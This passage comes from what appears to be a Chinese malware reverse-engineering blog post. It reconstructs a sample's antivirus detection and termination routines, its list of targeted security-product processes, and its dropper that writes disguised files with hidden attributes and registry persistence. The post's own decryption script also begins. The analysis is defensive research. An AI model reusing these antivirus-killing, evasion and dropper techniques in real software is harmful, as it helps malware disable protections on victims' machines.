最终得到明文进程名</span></span><br><span class="line">    init_blacklist(black_list);</span><br><span class="line"></span><br><span class="line">    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (snap == INVALID_HANDLE_VALUE) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    PROCESSENTRY32 pe = &#123; .dwSize = <span class="keyword">sizeof</span>(pe) &#125;;</span><br><span class="line">    <span class="keyword">if</span> (!Process32First(snap, &amp;pe)) &#123;</span><br><span class="line">        CloseHandle(snap);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sub_180060338(pe.szExeFile, black_list[i]) == <span class="number">0</span>) &#123;</span><br><span class="line">                dword_1800AAE1C = <span class="number">1</span>;</span><br><span class="line">                CloseHandle(snap);</span><br><span class="line">                <span class="keyword">return</span> pe.th32ProcessID;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (Process32Next(snap, &amp;pe));</span><br><span class="line"></span><br><span class="line">    CloseHandle(snap);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其黑名单进程名如下：<br><code>360Safe.exe</code>、<code>360sd.exe</code>、<code>360rp.exe</code>、<code>360rps.exe</code>、<code>360Tray.exe</code>、<code>ZhuDongFangYu.exe</code>、<code>360leakfixer.exe</code>、<code>360sdrun.exe</code>、<code>360sdupd.exe</code>、<code>360FileGuard.exe</code>、<code>dep360.exe</code>、<code>HipsMain.exe</code>、<code>HipsDaemon.exe</code>、<code>HipsTray.exe</code>、<code>HRUpdate.exe</code>、<code>HipsLog.exe</code>、<code>LenovoPcManagerService.exe</code>、<code>LenovoPcManager.exe</code>、<code>LAVService.exe</code>、<code>LenovoTray.exe</code>、<code>wsctrl7.exe</code>、<code>wsctrl10.exe</code>、<code>wsctrl11.exe</code>、<code>Bka.exe</code>、<code>BLuPro.exe</code>、<code>BkavService.exe</code>、<code>BkavUtil.exe</code>、<code>cefutil.exe</code>、<code>QHSafeMain.exe</code>、<code>QHSafeTray.exe</code>、<code>QQPCTray.exe</code>、<code>QQPCRTP.exe</code></p>
<p><code>env_window_process_gate_check</code>去混淆伪代码如下，通过查找是否有360tray.exe, 360sd.exe, 360safe.exe的进程或者存在类名为 <code>Q360SafeMonClass</code>窗口检测是否有360安全软件正在运行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">env_window_process_gate_check</span><span class="params">(ctx)</span> &#123;</span><br><span class="line">    <span class="type">int</span> p1 = find_process_id_by_image_name(ctx, decode_name_1()); <span class="comment">// 360Tray</span></span><br><span class="line">    <span class="type">int</span> p2 = find_process_id_by_image_name(ctx, decode_name_2()); <span class="comment">// 360SD</span></span><br><span class="line">    <span class="type">int</span> p3 = find_process_id_by_image_name(ctx, decode_name_3()); <span class="comment">// 360Safe</span></span><br><span class="line">    <span class="keyword">if</span> (p1) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p3 == <span class="number">0</span>) &#123;</span><br><span class="line">            HWND w = FindWindowExA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, decode_window_class(), <span class="literal">NULL</span>); <span class="comment">// Q360SafeMonClass</span></span><br><span class="line">            <span class="keyword">if</span> (w == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p2) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (p3) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果有，则会创建三个线程进行对抗：</p>
<p>遍历进程找到360tray.exe、360sd.exe、 360safe.exe、然后调用 <code>GetWindowThreadProcessId</code>获取进程id下的所有窗口。通过 <code>ChangeWindowMessageFilter</code>系列函数修改窗口的UIPI消息过滤器，允许特定消息从低完整性级别进程传递到窗口。之后遍历pid所有线程发送 <code>WM_QUIT</code>消息，再向对应的窗口通过调用 <code>PostMessageA</code>发送 <code>WM_QUIT</code>请求, 调用 <code>SendMessageA</code>发送 <code>WM_CLOSE</code>请求。然后调用 <code>GenerateConsoleCtrlEvent</code>发送 <code>Ctrl+C</code>消息来强行关闭对应控制台。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">DWORD <span class="title function_">StartAddress</span><span class="params">(...)</span> &#123;</span><br><span class="line">    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (snap == INVALID_HANDLE_VALUE) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Process32First(snap, &amp;pe)) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (match(pe.szExeFile, decode_proc_1()) ||    <span class="comment">//360tray.exe</span></span><br><span class="line">                match(pe.szExeFile, decode_proc_2()) ||    <span class="comment">//360sd.exe</span></span><br><span class="line">                match(pe.szExeFile, decode_proc_3())) &#123;    <span class="comment">//360safe.exe</span></span><br><span class="line">                EnumWindows(EnumFunc, pe.th32ProcessID);</span><br><span class="line">                HWND w = FindWindowExA(<span class="literal">NULL</span>, <span class="literal">NULL</span>, decode_window_class_2(), <span class="literal">NULL</span>);</span><br><span class="line">                PostMessageA(w, WM_CLOSE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (Process32Next(snap, &amp;pe));</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(snap);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">EnumFunc</span><span class="params">(HWND h, DWORD pid)</span> &#123;</span><br><span class="line">    GetWindowThreadProcessId(h, &amp;dwPid);</span><br><span class="line">    <span class="keyword">if</span> (dwPid == pid) &#123;</span><br><span class="line">        ChangeWindowMessageFilterEx(h, WM_QUIT, MSGFLT_ALLOW, <span class="literal">NULL</span>);</span><br><span class="line">        ChangeWindowMessageFilter(WM_QUIT, MSGFLT_ADD);</span><br><span class="line">        sub_1800421C0(pid);    <span class="comment">//遍历pid所有线程发送WM_QUIT消息</span></span><br><span class="line">        PostMessageA(h, WM_QUIT, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        SendMessageA(h, WM_CLOSE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        GenerateConsoleCtrlEvent(CTRL_C_EVENT, dwPid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>若仍未关闭，则先调用 <code>RtlGetVersion</code>检测os版本信息，win7以上会调用com组件收集信息。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">check_windows_version_supported</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// RtlGetVersion</span></span><br><span class="line">    <span class="keyword">if</span> (!ntdll || !RtlGetVersion || RtlGetVersion(&amp;os) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (os.dwMajorVersion &gt; <span class="number">6</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (os.dwMajorVersion == <span class="number">6</span> &amp;&amp; os.dwMinorVersion == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// Win7</span></span><br><span class="line">    <span class="keyword">if</span> (os.dwMajorVersion == <span class="number">6</span> &amp;&amp; os.dwMinorVersion &gt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;  <span class="comment">// Win8+</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>rclsid&#x3D;4590F811-1D3A-11D0-891F-00AA004B2E24</p>
<p>riid&#x3D;DC12A687-737F-11CF-884D-00AA004B2E24</p>
<p>伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_180012250</span><span class="params">()</span> &#123;</span><br><span class="line">    CoInitializeEx(<span class="literal">NULL</span>, COINIT_MULTITHREADED);</span><br><span class="line">    CoInitializeSecurity(<span class="literal">NULL</span>, <span class="number">-1</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, RPC_C_IMP_LEVEL_IMPERSONATE, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    WmiCtx ctx = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    init_ctx(&amp;ctx); </span><br><span class="line">    <span class="keyword">if</span> (!wmi_connect_and_set_proxy(&amp;ctx)) &#123; </span><br><span class="line">        free_ctx_basic(&amp;ctx);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">vector</span>&lt;AdapterRec&gt; recs = &#123;&#125;;</span><br><span class="line">    query_connected_adapters(&amp;ctx, &amp;recs);  </span><br><span class="line">    <span class="built_in">vector</span>&lt;ResultRec&gt; out = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (AdapterRec &amp;r : recs) &#123;</span><br><span class="line">        <span class="comment">// 先尝试禁用，再写注册表，再收集结果</span></span><br><span class="line">        wmi_toggle_adapter(&amp;ctx, r.device_id, <span class="literal">false</span>);  </span><br><span class="line">        persist_adapter_ip_to_reg(r.ip_or_text, r.device_id); </span><br><span class="line">        out_push(&amp;out, r.device_id, r.text2);</span><br><span class="line">    &#125;</span><br><span class="line">    release_wmi_ctx(&amp;ctx);</span><br><span class="line">    CoUninitialize(); </span><br><span class="line">    destroy(recs); destroy(ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>wmi_connect_and_set_proxy</code>调用 <code>CoInitializeEx</code> 初始化 COM 库，使用 <code>CoCreateInstance</code> 创建 <code>CLSID_WbemLocator</code> 对象。通过 <code>IWbemLocator::ConnectServer</code> 连接到 <code>\\.\root\CIMV2</code>。这是 Windows 管理硬件驱动和网络配置的核心数据库。调用 <code>CoSetProxyBlanket</code> 设置安全级别（通常为 <code>RPC_C_IMP_LEVEL_IMPERSONATE</code>），确保 WMI 服务有权限代表当前进程执行操作。</p>
<p><code>query_connected_adapters</code>函数调用 <code>IWbemServices::ExecQuery</code> 执行WQL语句 <code>SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionStatus = 2</code>，2代表Connected。</p>
<p>程序遍历返回的 <code>IEnumWbemClassObject</code> 枚举器，提取 <code>DeviceID</code>（设备ID）和 <code>Index</code>（索引）。</p>
<p>详细可看：<a target="_blank" rel="noopener" href="https://www.freebuf.com/defense/384276.html">防守实战 | 蜜罐反制之信息收集木马逆向分析 - FreeBuf网络安全行业门户</a></p>
<h5 id="文件落地"><a href="#文件落地" class="headerlink" title="文件落地"></a>文件落地</h5><p><code>drop_files_and_set_registry_persistence</code>还原后的伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">drop_files_and_set_registry_persistence</span><span class="params">(ctx, out_buf)</span> &#123;</span><br><span class="line">    <span class="comment">// 1) 构建落地路径并创建目录</span></span><br><span class="line">    <span class="type">char</span> base[MAX_PATH];</span><br><span class="line">    SHGetFolderPathA(<span class="literal">NULL</span>, CSIDL_PERSONAL, <span class="literal">NULL</span>, <span class="number">0</span>, base); <span class="comment">// Documents</span></span><br><span class="line">    <span class="built_in">memcpy</span>(out_buf, build_drop_file_paths_and_create_dirs(ctx, tmp, base), <span class="number">0xB3E</span>);</span><br><span class="line">    <span class="comment">// 2) 读取当前模块，定位内嵌密文块</span></span><br><span class="line">    <span class="type">char</span> self[MAX_PATH];</span><br><span class="line">    <span class="keyword">if</span> (!GetModuleFileNameA(<span class="literal">NULL</span>, self, MAX_PATH)) throw runtime_error(...);</span><br><span class="line">    stream s = open_file_stream(self);</span><br><span class="line"></span><br><span class="line">    uint32 payload_off = <span class="number">0</span>;</span><br><span class="line">    uint32 payload_len = find_marker_qemb_block(s, &amp;payload_off); <span class="comment">// marker=&quot;QEMB8WGP&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (!payload_len) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    bytes enc_blob = read_bytes_from_self(s, payload_off, payload_len);</span><br><span class="line">    <span class="keyword">if</span> (enc_blob.empty()) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 从 PE 头取 TimeDateStamp，作为 4 字节循环异或键</span></span><br><span class="line">    uint32 pe_timestamp = read_pe_coff_timestamp(s);</span><br><span class="line">    <span class="keyword">if</span> (!pe_timestamp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    bytes decoded_blob = xor_with_u32_repeating(enc_blob, pe_timestamp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 用 5 组“起止标签”从 decoded_blob 抽取 5 段数据</span></span><br><span class="line">    bytes p1 = extract_between_tags(decoded_blob, dec(qword_1800A85E8), dec(qword_1800A8678));</span><br><span class="line">    bytes p2 = extract_between_tags(decoded_blob, dec(qword_1800A8600), dec(qword_1800A8618));</span><br><span class="line">    bytes p3 = extract_between_tags(decoded_blob, dec(qword_1800A8660), dec(qword_1800A8630));</span><br><span class="line">    bytes p4 = extract_between_tags(decoded_blob, dec(qword_1800A85D0), dec(qword_1800A8690));</span><br><span class="line">    bytes p5 = extract_between_tags(decoded_blob, dec(qword_1800A86A8), dec(qword_1800A8648));</span><br><span class="line">    <span class="comment">// dec(...) = xor_decode_string_with_key(..., 0x68)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 特定位补零后写盘（写前再做 rolling_xor_transform）</span></span><br><span class="line">    p1[p1.size()<span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">    write_transformed_file(ctx, out_buf + <span class="number">278</span>,  p1, <span class="literal">false</span>); <span class="comment">// &lt;Rand6&gt;.exe</span></span><br><span class="line"></span><br><span class="line">    *(uint32*)&amp;p2[p2.size()<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">    write_transformed_file(ctx, out_buf + <span class="number">538</span>,  p2, <span class="literal">false</span>); <span class="comment">// npwzwmc64.dll</span></span><br><span class="line"></span><br><span class="line">    p3[<span class="number">0x0F</span>] = <span class="number">0</span>;</span><br><span class="line">    write_transformed_file(ctx, out_buf + <span class="number">798</span>,  p3, <span class="literal">false</span>); <span class="comment">// space.ico</span></span><br><span class="line"></span><br><span class="line">    p4[<span class="number">0x0F</span>] = <span class="number">0</span>;</span><br><span class="line">    write_transformed_file(ctx, out_buf + <span class="number">1058</span>, p4, <span class="literal">false</span>); <span class="comment">// vdi_ipc.dat</span></span><br><span class="line"></span><br><span class="line">    *(uint32*)&amp;p5[p5.size()<span class="number">-4</span>] = <span class="number">0</span>;</span><br><span class="line">    write_transformed_file(ctx, <span class="string">&quot;C:\\Windows\\Temp\\ranchserv.jpg&quot;</span>, p5, <span class="literal">true</span>); <span class="comment">// fix PE checksum</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) 4 个主文件置 Hidden|System</span></span><br><span class="line">    set_file_hidden_system_attrs(ctx, out_buf + <span class="number">278</span>);</span><br><span class="line">    set_file_hidden_system_attrs(ctx, out_buf + <span class="number">538</span>);</span><br><span class="line">    set_file_hidden_system_attrs(ctx, out_buf + <span class="number">798</span>);</span><br><span class="line">    set_file_hidden_system_attrs(ctx, out_buf + <span class="number">1058</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7) 写 HKLM 持久化数据</span></span><br><span class="line">    <span class="type">int</span> retry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!persist_hklm_software_jdbcc_data(ctx) &amp;&amp; retry &lt; <span class="number">10</span>) &#123;</span><br><span class="line">        Sleep(<span class="number">10000</span>);</span><br><span class="line">        retry++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先获取文档 <code>C:\\Users\\用户名\\Documents</code>目录，然后生成 4 条落地路径并创建目录；</p>
<ol>
<li><code>&lt;Base&gt;\&lt;Rand8&gt;\&lt;Rand6&gt;.exe</code></li>
<li><code>&lt;Base&gt;\&lt;Rand8&gt;\npwzwmc64.dll</code></li>
<li><code>&lt;Base&gt;\&lt;Rand8&gt;\space.ico</code></li>
<li><code>&lt;Base&gt;\&lt;Rand8&gt;\vdi_ipc.dat</code></li>
</ol>
<p>另外还会释放第五个文件于 <code>C:\Windows\Temp</code>下, 文件名固定为 <code>ranchserv.jpg</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="title function_">build_drop_file_paths_and_create_dirs</span><span class="params">(ctx, out, base)</span> &#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="built_in">strcpy</span>(out, base);</span><br><span class="line"></span><br><span class="line">    gen_rand_alpha(out + <span class="number">260</span>, <span class="number">8</span>); <span class="comment">// a-zA-Z0, 长度8</span></span><br><span class="line">    gen_rand_alpha(out + <span class="number">269</span>, <span class="number">6</span>); <span class="comment">// a-zA-Z0, 长度6</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(out + <span class="number">278</span>,  <span class="string">&quot;%s%s\\%s.exe&quot;</span>, out, out + <span class="number">260</span>, out + <span class="number">269</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(out + <span class="number">538</span>,  <span class="string">&quot;%s%s\\&quot;</span>,      out, out + <span class="number">260</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(out + <span class="number">798</span>,  <span class="string">&quot;%s%s\\&quot;</span>,      out, out + <span class="number">260</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(out + <span class="number">1058</span>, <span class="string">&quot;%s%s\\&quot;</span>,      out, out + <span class="number">260</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 三个固定名：先 xor(0x68) 再 xor(0xCF)，再去掉前缀 &quot;LK@&quot;</span></span><br><span class="line">    <span class="comment">// qword_1800A8618 -&gt; &quot;LK@npwzwmc64.dll&quot;</span></span><br><span class="line">    <span class="comment">// qword_1800A8630 -&gt; &quot;LK@space.ico&quot;</span></span><br><span class="line">    <span class="comment">// qword_1800A8690 -&gt; &quot;LK@vdi_ipc.dat&quot;</span></span><br><span class="line">    strcat_s(out + <span class="number">538</span>,  <span class="number">260</span>, <span class="string">&quot;npwzwmc64.dll&quot;</span>);</span><br><span class="line">    strcat_s(out + <span class="number">798</span>,  <span class="number">260</span>, <span class="string">&quot;space.ico&quot;</span>);</span><br><span class="line">    strcat_s(out + <span class="number">1058</span>, <span class="number">260</span>, <span class="string">&quot;vdi_ipc.dat&quot;</span>);</span><br><span class="line"></span><br><span class="line">    create_dir_recursive(out + <span class="string">&quot;/&quot;</span> + (out+<span class="number">260</span>));</span><br><span class="line">    set_dir_hidden_system(out + <span class="string">&quot;/&quot;</span> + (out+<span class="number">260</span>));</span><br><span class="line">    <span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着读取自身文件, 从中寻找标志数据”QEMB8WGP”, 然后读取标志文本后的4个字节(0x9B0423)作为应提取的数据大小。</p>
<p>解析样本PE头 <code>IMAGE_FILE_HEADER.TimeDateStamp</code>得到一处解密密钥。</p>
<p>解密落地文件脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INPUT_PATH = Path(<span class="string">&quot;sample_ioc.exe&quot;</span>)</span><br><span class="line">OUTPUT_DIR = Path(<span class="string">&quot;stage3_drop_files&quot;</span>)</span><br><span class="line">MARKER = <span class="string">b&quot;QEMB8WGP&quot;</span></span><br><span class="line">ROLLING_KEY = <span class="number">0x963239FD</span>  <span class="comment"># sub_1800195F0</span></span><br><span class="line"></span><br><span class="line">RAW_85E8 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;85 B8 A5 C0 C0 C0 C0 C0 C0 C0 C0 C0 C0 C1 7A 60&quot;</span>)</span><br><span class="line">RAW_8678 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;EB EC E7 E9 EA 96 E0 89 C2 DF C2 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7&quot;</span>)</span><br><span class="line">RAW_8600 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;84 AC AC C0 C0 C0 C0 C0 C0 C0 C0 C0 C0 F7 92 C0&quot;</span>)</span><br><span class="line">RAW_8618 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;EB EC E7 C9 D7 D0 DD D0 CA C4 91 93 89 C3 CB CB A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7&quot;</span>)</span><br><span class="line">RAW_8660 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;89 A3 AF C0 C0 C0 C0 C0 C0 C0 C0 C0 C0 C0 E0 0E&quot;</span>)</span><br><span class="line">RAW_8630 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;EB EC E7 D4 D7 C6 C4 C2 89 CE C4 C8 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7 A7&quot;</span>)</span><br><span class="line">RAW_85D0 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;84 A1 B4 C0 C0 C0 C0 C0 C0 C0 C0 C0 C0 A1 A7 95&quot;</span>)</span><br><span class="line">RAW_8690 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;EB EC E7 D1 C3 CE 